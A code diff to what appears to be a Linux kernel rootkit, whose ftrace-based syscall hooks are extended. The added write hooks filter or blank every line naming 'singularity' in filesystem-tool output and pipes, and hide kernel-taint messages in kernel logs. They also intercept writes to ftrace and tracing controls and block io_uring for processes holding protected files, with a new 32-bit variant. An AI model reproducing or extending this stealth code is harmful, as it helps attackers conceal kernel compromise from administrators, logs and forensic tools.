@@ -37,6 +37,304 @@ static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
 static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);
 static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);
 
+static notrace void *memmem_k(const void *haystack, size_t hlen,
+                               const void *needle, size_t nlen)
+{
+    const unsigned char *h = haystack;
+    const unsigned char *n = needle;
+    size_t i, j;
+    
+    if (nlen == 0 || nlen > hlen)
+        return NULL;
+    
+    for (i = 0; i <= hlen - nlen; i++) {
+        for (j = 0; j < nlen; j++) {
+            if (h[i + j] != n[j])
+                break;
+        }
+        if (j == nlen)
+            return (void *)(h + i);
+    }
+    return NULL;
+}
+
+static notrace void *memmem_ci(const void *haystack, size_t hlen,
+                                const void *needle, size_t nlen)
+{
+    const unsigned char *h = haystack;
+    const unsigned char *n = needle;
+    size_t i, j;
+    
+    if (nlen == 0 || nlen > hlen)
+        return NULL;
+    
+    for (i = 0; i <= hlen - nlen; i++) {
+        for (j = 0; j < nlen; j++) {
+            unsigned char hc = h[i + j];
+            unsigned char nc = n[j];
+            if (hc >= 'A' && hc <= 'Z') hc += 32;
+            if (nc >= 'A' && nc <= 'Z') nc += 32;
+            if (hc != nc)
+                break;
+        }
+        if (j == nlen)
+            return (void *)(h + i);
+    }
+    return NULL;
+}
+
+static notrace bool buffer_has_taint(const char *buf, size_t len)
+{
+    if (!buf || len == 0)
+        return false;
+    return memmem_ci(buf, len, "taint", 5) != NULL;
+}
+
+static notrace bool buffer_has_singularity(const char *buf, size_t len)
+{
+    if (!buf || len == 0)
+        return false;
+    return memmem_ci(buf, len, "singularity", 11) != NULL;
+}
+
+static notrace bool process_has_block_device_open(void)
+{
+    struct files_struct *files;
+    struct fdtable *fdt;
+    struct file *file;
+    unsigned int i;
+    bool has_blkdev = false;
+    unsigned long flags;
+    struct inode *inode;
+
+    files = current->files;
+    if (!files)
+        return false;
+
+    spin_lock_irqsave(&files->file_lock, flags);
+    
+    fdt = files_fdtable(files);
+    if (!fdt) {
+        spin_unlock_irqrestore(&files->file_lock, flags);
+        return false;
+    }
+    
+    for (i = 0; i < fdt->max_fds && i < 256; i++) {
+        file = fdt->fd[i];
+        if (!file)
+            continue;
+        
+        if (!file->f_path.dentry)
+            continue;
+            
+        inode = file->f_path.dentry->d_inode;
+        if (!inode)
+            continue;
+        
+        if (S_ISBLK(inode->i_mode)) {
+            has_blkdev = true;
+            break;
+        }
+    }
+    
+    spin_unlock_irqrestore(&files->file_lock, flags);
+    return has_blkdev;
+}
+
+static notrace bool fd_is_pipe(int fd)
+{
+    struct file *file;
+    struct inode *inode;
+    bool is_pipe = false;
+    
+    file = fget(fd);
+    if (!file)
+        return false;
+    
+    if (file->f_path.dentry) {
+        inode = file->f_path.dentry->d_inode;
+        if (inode && S_ISFIFO(inode->i_mode))
+            is_pipe = true;
+    }
+    
+    fput(file);
+    return is_pipe;
+}
+
+static notrace bool is_fs_tool_output(const char *buf, size_t len)
+{
+    if (memmem_k(buf, len, "debugfs:", 8))
+        return true;
+    
+    if (len > 10) {
+        size_t i = 0;
+        int spaces = 0;
+        int digits = 0;
+        
+        while (i < len && buf[i] == ' ') {
+            spaces++;
+            i++;
+        }
+        
+        while (i < len && buf[i] >= '0' && buf[i] <= '9') {
+            digits++;
+            i++;
+        }
+        
+        if (digits >= 1 && spaces >= 1) {
+            if (memmem_k(buf, len, "(", 1) && memmem_k(buf, len, ")", 1))
+                return true;
+        }
+    }
+    
+    if (memmem_k(buf, len, "Inode count:", 12))
+        return true;
+    if (memmem_k(buf, len, "Block count:", 12))
+        return true;
+    if (memmem_k(buf, len, "Filesystem volume name:", 23))
+        return true;
+    if (memmem_k(buf, len, "Filesystem UUID:", 16))
+        return true;
+    if (memmem_k(buf, len, "e2fsck", 6))
+        return true;
+    if (memmem_k(buf, len, "Inode:", 6))
+        return true;
+    
+    return false;
+}
+
+static notrace bool is_kernel_log_output(const char *buf, size_t len)
+{
+    if (len < 50)
+        return false;
+    
+    if (memmem_k(buf, len, "[    ", 5) || memmem_k(buf, len, "[ ", 2)) {
+        if (memmem_k(buf, len, "] ", 2))
+            return true;
+    }
+    
+    if (memmem_k(buf, len, "kernel:", 7))
+        return true;
+    
+    if (memmem_k(buf, len, " kernel:", 8))
+        return true;
+    
+    return false;
+}
+
+static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
+{
+    const size_t pattern_len = 11;
+    char *ptr;
+    size_t remaining;
+    void *found;
+    
+    if (!buf || len < pattern_len)
+        return;
+    
+    ptr = buf;
+    remaining = len;
+    
+    while (remaining >= pattern_len) {
+        found = memmem_ci(ptr, remaining, "singularity", pattern_len);
+        if (!found)
+            break;
+        
+        memset(found, ' ', pattern_len);
+        
+        ptr = (char *)found + pattern_len;
+        remaining = len - (ptr - buf);
+    }
+}
+
+static notrace ssize_t filter_singularity_lines(char *buf, size_t len)
+{
+    char *out;
+    size_t out_len = 0;
+    size_t i = 0;
+    
+    if (!buf || len == 0)
+        return 0;
+    
+    out = kmalloc(len, GFP_ATOMIC);
+    if (!out)
+        return len;
+    
+    while (i < len) {
+        size_t line_start = i;
+        size_t line_end;
+        size_t line_len;
+        bool skip_line = false;
+        
+        while (i < len && buf[i] != '\n')
+            i++;
+        
+        if (i < len && buf[i] == '\n')
+            i++;
+        
+        line_end = i;
+        line_len = line_end - line_start;
+        
+        if (buffer_has_singularity(buf + line_start, line_len))
+            skip_line = true;
+        
+        if (!skip_line && line_len > 0) {
+            memcpy(out + out_len, buf + line_start, line_len);
+            out_len += line_len;
+        }
+    }
+    
+    if (out_len > 0)
+        memcpy(buf, out, out_len);
+    
+    kfree(out);
+    return out_len;
+}
+
+static notrace ssize_t filter_taint_lines(char *buf, size_t len)
+{
+    char *out;
+    size_t out_len = 0;
+    size_t i = 0;
+    
+    if (!buf || len == 0)
+        return 0;
+    
+    out = kmalloc(len, GFP_ATOMIC);
+    if (!out)
+        return len;
+    
+    while (i < len) {
+        size_t line_start = i;
+        size_t line_end;
+        size_t line_len;
+        bool skip_line = false;
+        
+        while (i < len && buf[i] != '\n')
+            i++;
+        
+        if (i < len && buf[i] == '\n')
+            i++;
+        
+        line_end = i;
+        line_len = line_end - line_start;
+        
+        if (buffer_has_taint(buf + line_start, line_len))
+            skip_line = true;
+        
+        if (!skip_line && line_len > 0) {
+            memcpy(out + out_len, buf + line_start, line_len);
+            out_len += line_len;
+        }
+    }
+    
+    if (out_len > 0)
+        memcpy(buf, out, out_len);
+    
+    kfree(out);
+    return out_len;
+}
+
 static notrace bool is_real_ftrace_enabled(struct file *file)
 {
     const char *name = NULL;
@@ -116,56 +414,9 @@ static notrace bool is_real_tracing_on(struct file *file)
     return true;
 }
 
-static notrace bool is_sysctl_writes_strict(struct file *file)
-{
-    const char *name = NULL;
-    struct dentry *dentry;
-    struct super_block *sb;
-    struct dentry *parent;
-    
-    if (!file || !file->f_path.dentry)
-        return false;
-    
-    dentry = file->f_path.dentry;
-    
-    if (dentry->d_name.name)
-        name = dentry->d_name.name;
-    
-    if (!name || strcmp(name, "sysctl_writes_strict") != 0)
-        return false;
-    
-    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
-        return false;
-    
-    sb = file->f_path.mnt->mnt_sb;
-    
-    if (!sb->s_type || !sb->s_type->name)
-        return false;
-    
-    if (strcmp(sb->s_type->name, "proc") != 0 && 
-        strcmp(sb->s_type->name, "sysfs") != 0)
-        return false;
-    
-    parent = dentry->d_parent;
-    if (!parent || !parent->d_name.name)
-        return false;
-    
-    if (strcmp(parent->d_name.name, "kernel") != 0)
-        return false;
-    
-    parent = parent->d_parent;
-    if (!parent || !parent->d_name.name)
-        return false;
-    
-    if (strcmp(parent->d_name.name, "sys") != 0)
-        return false;
-    
-    return true;
-}
-
-static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
+static notrace asmlinkage ssize_t hooked_write_ftrace(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
-                                                     bool compat32, bool has_offset)
+                                                     bool compat32)
 {
     int fd;
     const char __user *user_buf;
@@ -177,9 +428,6 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     long parsed_value;
     int ret;
     ssize_t result = -EINVAL;
-    bool is_sysctl_strict = false;
-    bool is_ftrace = false;
-    bool is_tracing = false;
     loff_t pos;
 
     if (!orig || !regs)
@@ -199,24 +447,10 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     if (!file)
         return orig(regs);
 
-    is_sysctl_strict = is_sysctl_writes_strict(file);
-    is_ftrace = is_real_ftrace_enabled(file);
-    is_tracing = is_real_tracing_on(file);
     pos = file->f_pos;
 
-    if (!is_ftrace && !is_tracing && !is_sysctl_strict) {
-        fput(file);
-        return orig(regs);
-    }
-
-    if (is_sysctl_strict) {
-        fput(file);
-        return orig(regs);
-    }
-
-    if (pos == 0) {
+    if (pos == 0)
         ftrace_write_intercepted = false;
-    }
 
     if (count == 0) {
         fput(file);
@@ -244,11 +478,11 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             (c >= 'a' && c <= 'f') ||
             (c >= 'A' && c <= 'F') ||
             c == 'x' || c == 'X' ||
-            c == '-' ||                
+            c == '-' ||
             c == ' ' || c == '\t' ||
             c == '\n' || c == '\r' || 
             c == '\f' || c == '\v' ||
-            c == '\0') {             
+            c == '\0') {
             continue;
         }
         
@@ -334,22 +568,268 @@ out:
 
 static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_write, false, false);
+    int fd;
+    char __user *user_buf;
+    size_t count;
+    struct file *file;
+    char *kernel_buf = NULL;
+    ssize_t filtered_len;
+    ssize_t ret;
+    bool needs_taint_filter;
+    bool needs_singularity_filter;
+    bool is_fs_tool;
+    bool is_pipe;
+    size_t original_count;
+
+    if (!regs)
+        return -EINVAL;
+
+    fd = (int)regs->di;
+    user_buf = (char __user *)regs->si;
+    count = (size_t)regs->dx;
+    original_count = count;
+
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+        
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_write, false);
+        }
+    }
+
+    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
+        return original_write(regs);
+
+    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return original_write(regs);
+
+    if (copy_from_user(kernel_buf, user_buf, count)) {
+        kvfree(kernel_buf);
+        return original_write(regs);
+    }
+    kernel_buf[count] = '\0';
+
+    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
+    is_pipe = fd_is_pipe(fd);
+
+    needs_taint_filter = buffer_has_taint(kernel_buf, count) && 
+                         is_kernel_log_output(kernel_buf, count);
+    needs_singularity_filter = buffer_has_singularity(kernel_buf, count) &&
+                               (is_fs_tool || is_pipe);
+
+    if (!needs_taint_filter && !needs_singularity_filter) {
+        kvfree(kernel_buf);
+        return original_write(regs);
+    }
+
+    if (needs_singularity_filter && is_fs_tool && !is_pipe) {
+        sanitize_fs_tool_buffer_inplace(kernel_buf, count);
+        
+        if (copy_to_user(user_buf, kernel_buf, count)) {
+            kvfree(kernel_buf);
+            return original_write(regs);
+        }
+        
+        kvfree(kernel_buf);
+        return original_write(regs);
+    }
+
+    if (needs_singularity_filter && is_pipe) {
+        filtered_len = filter_singularity_lines(kernel_buf, count);
+        
+        if (filtered_len == 0) {
+            kvfree(kernel_buf);
+            return original_count;
+        }
+        
+        count = filtered_len;
+    }
+
+    if (needs_taint_filter) {
+        filtered_len = filter_taint_lines(kernel_buf, count);
+        
+        if (filtered_len == 0) {
+            kvfree(kernel_buf);
+            return original_count;
+        }
+    } else {
+        filtered_len = count;
+    }
+
+    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        return original_write(regs);
+    }
+
+    kvfree(kernel_buf);
+
+    {
+        struct pt_regs modified_regs = *regs;
+        modified_regs.dx = filtered_len;
+        ret = original_write(&modified_regs);
+    }
+
+    return (ret > 0) ? (ssize_t)original_count : ret;
 }
 
 static notrace asmlinkage ssize_t hooked_write32(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_write32, true, false);
+    int fd;
+    char __user *user_buf;
+    size_t count;
+    struct file *file;
+    char *kernel_buf = NULL;
+    ssize_t filtered_len;
+    ssize_t ret;
+    bool needs_taint_filter;
+    bool needs_singularity_filter;
+    bool is_fs_tool;
+    bool is_pipe;
+    size_t original_count;
+
+    if (!regs)
+        return -EINVAL;
+
+    fd = (int)regs->bx;
+    user_buf = (char __user *)regs->cx;
+    count = (size_t)regs->dx;
+    original_count = count;
+
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+        
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_write32, true);
+        }
+    }
+
+    if (count == 0 || count > (2 * 1024 * 1024) || fd < 1)
+        return original_write32(regs);
+
+    kernel_buf = kvmalloc(count + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return original_write32(regs);
+
+    if (copy_from_user(kernel_buf, user_buf, count)) {
+        kvfree(kernel_buf);
+        return original_write32(regs);
+    }
+    kernel_buf[count] = '\0';
+
+    is_fs_tool = process_has_block_device_open() || is_fs_tool_output(kernel_buf, count);
+    is_pipe = fd_is_pipe(fd);
+
+    needs_taint_filter = buffer_has_taint(kernel_buf, count) && 
+                         is_kernel_log_output(kernel_buf, count);
+    needs_singularity_filter = buffer_has_singularity(kernel_buf, count) &&
+                               (is_fs_tool || is_pipe);
+
+    if (!needs_taint_filter && !needs_singularity_filter) {
+        kvfree(kernel_buf);
+        return original_write32(regs);
+    }
+
+    if (needs_singularity_filter && is_fs_tool && !is_pipe) {
+        sanitize_fs_tool_buffer_inplace(kernel_buf, count);
+        
+        if (copy_to_user(user_buf, kernel_buf, count)) {
+            kvfree(kernel_buf);
+            return original_write32(regs);
+        }
+        
+        kvfree(kernel_buf);
+        return original_write32(regs);
+    }
+
+    if (needs_singularity_filter && is_pipe) {
+        filtered_len = filter_singularity_lines(kernel_buf, count);
+        
+        if (filtered_len == 0) {
+            kvfree(kernel_buf);
+            return original_count;
+        }
+        
+        count = filtered_len;
+    }
+
+    if (needs_taint_filter) {
+        filtered_len = filter_taint_lines(kernel_buf, count);
+        
+        if (filtered_len == 0) {
+            kvfree(kernel_buf);
+            return original_count;
+        }
+    } else {
+        filtered_len = count;
+    }
+
+    if (copy_to_user(user_buf, kernel_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        return original_write32(regs);
+    }
+
+    kvfree(kernel_buf);
+
+    {
+        struct pt_regs modified_regs = *regs;
+        modified_regs.dx = filtered_len;
+        ret = original_write32(&modified_regs);
+    }
+
+    return (ret > 0) ? (ssize_t)original_count : ret;
 }
 
 static notrace asmlinkage ssize_t hooked_pwrite64(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_pwrite64, false, true);
+    int fd;
+    struct file *file;
+
+    if (!regs)
+        return -EINVAL;
+
+    fd = (int)regs->di;
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+        
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_pwrite64, false);
+        }
+    }
+
+    return original_pwrite64(regs);
 }
 
 static notrace asmlinkage ssize_t hooked_pwrite64_ia32(const struct pt_regs *regs)
 {
-    return hooked_write_common(regs, original_pwrite64_ia32, true, true);
+    int fd;
+    struct file *file;
+
+    if (!regs)
+        return -EINVAL;
+
+    fd = (int)regs->bx;
+    file = fget(fd);
+    if (file) {
+        bool is_ftrace = is_real_ftrace_enabled(file);
+        bool is_tracing = is_real_tracing_on(file);
+        fput(file);
+        
+        if (is_ftrace || is_tracing) {
+            return hooked_write_ftrace(regs, original_pwrite64_ia32, true);
+        }
+    }
+
+    return original_pwrite64_ia32(regs);
 }
 
 static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *regs,
@@ -421,7 +901,7 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
                                                             asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                             bool compat32)
 {
-    int out_fd, in_fd;
+    int out_fd;
     size_t count;
     struct file *out_file;
 
@@ -430,11 +910,9 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
 
     if (!compat32) {
         out_fd = regs->di;
-        in_fd  = regs->si;
         count  = regs->r10;
     } else {
         out_fd = regs->bx;
-        in_fd  = regs->cx;
         count  = regs->si;
     }
 
@@ -485,7 +963,7 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
                                                                 asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                                 bool compat32)
 {
-    int fd_in, fd_out;
+    int fd_out;
     size_t count;
     struct file *out_file;
 
@@ -493,11 +971,9 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
         return -EINVAL;
 
     if (!compat32) {
-        fd_in  = regs->di;
         fd_out = regs->r10;
         count  = regs->r8;
     } else {
-        fd_in  = regs->bx;
         fd_out = regs->si;
         count  = regs->r8;
     }
@@ -529,7 +1005,7 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
                                                        asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                        bool compat32)
 {
-    int fd_in, fd_out;
+    int fd_out;
     size_t count;
     struct file *out_file;
 
@@ -537,11 +1013,9 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
         return -EINVAL;
 
     if (!compat32) {
-        fd_in  = regs->di;
         fd_out = regs->dx;
         count  = regs->r10;
     } else {
-        fd_in  = regs->bx;
         fd_out = regs->dx;
         count  = regs->si;
     }
@@ -615,7 +1089,7 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
                                                     asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                     bool compat32)
 {
-    int fd_in, fd_out;
+    int fd_out;
     size_t count;
     struct file *out_file;
 
@@ -623,11 +1097,9 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
         return -EINVAL;
 
     if (!compat32) {
-        fd_in  = regs->di;
         fd_out = regs->si;
         count  = regs->dx;
     } else {
-        fd_in  = regs->bx;
         fd_out = regs->cx;
         count  = regs->dx;
     }
@@ -696,24 +1168,13 @@ static bool process_has_protected_fd(void)
 
 static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
 {
-    unsigned int uring_fd;
-    unsigned int to_submit;
-    unsigned int min_complete;
-    unsigned int flags_param;
     pid_t current_pid;
     bool should_block = false;
     unsigned long cache_flags;
 
-    if (!regs)
-        return -EINVAL;
-    
-    if (!original_io_uring_enter)
+    if (!regs || !original_io_uring_enter)
         return -EINVAL;
 
-    uring_fd = regs->di;
-    to_submit = regs->si;
-    min_complete = regs->dx;
-    flags_param = regs->r10;
     current_pid = current->pid;
 
     spin_lock_irqsave(&cache_lock, cache_flags);
@@ -738,6 +1199,52 @@ static notrace asmlinkage long hooked_io_uring_enter(const struct pt_regs *regs)
         return -EINVAL;
 
     return original_io_uring_enter(regs);
+}
+
+static notrace asmlinkage long hooked_io_uring_enter_ia32(const struct pt_regs *regs)
+{
+    unsigned int uring_fd;
+    unsigned int to_submit;
+    unsigned int min_complete;
+    unsigned int flags_param;
+    pid_t current_pid;
+    bool should_block = false;
+    unsigned long cache_flags;
+
+    if (!regs)
+        return -EINVAL;
+    
+    if (!original_io_uring_enter2)
+        return -EINVAL;
+
+    uring_fd = regs->bx;
+    to_submit = regs->cx;
+    min_complete = regs->dx;
+    flags_param = regs->si;
+    current_pid = current->pid;
+
+    spin_lock_irqsave(&cache_lock, cache_flags);
+    if (current_pid == last_blocked_pid && 
+        time_before(jiffies, last_check_jiffies + HZ)) {
+        should_block = true;
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+    } else {
+        spin_unlock_irqrestore(&cache_lock, cache_flags);
+        
+        should_block = process_has_protected_fd();
+        
+        if (should_block) {
+            spin_lock_irqsave(&cache_lock, cache_flags);
+            last_blocked_pid = current_pid;
+            last_check_jiffies = jiffies;
+            spin_unlock_irqrestore(&cache_lock, cache_flags);
+        }
+    }
+
+    if (should_block)
+        return -EINVAL;
+
+    return original_io_uring_enter2(regs);
 }
 
 static struct ftrace_hook hooks[] = {
